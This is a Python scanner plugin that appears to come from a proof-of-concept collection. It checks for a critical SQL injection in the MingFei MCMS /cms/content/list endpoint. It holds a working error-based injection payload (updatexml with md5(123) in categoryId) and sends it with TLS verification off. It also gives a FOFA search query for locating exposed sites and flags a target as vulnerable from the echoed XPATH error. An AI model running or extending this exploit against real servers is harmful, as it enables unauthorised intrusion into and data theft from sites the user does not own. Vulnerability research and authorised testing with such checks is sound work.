#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/fwUOzibsjKQIz0kUvmHZkw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '铭飞CMS cms/content/list接口存在SQL注入',

      'level'     :   'critical',

      'FOFA'      :   'body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/16',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Connection': 'Keep-Alive',
      }
  target = '/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'XPATH.*?syntax.*?error.*?202cb962',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret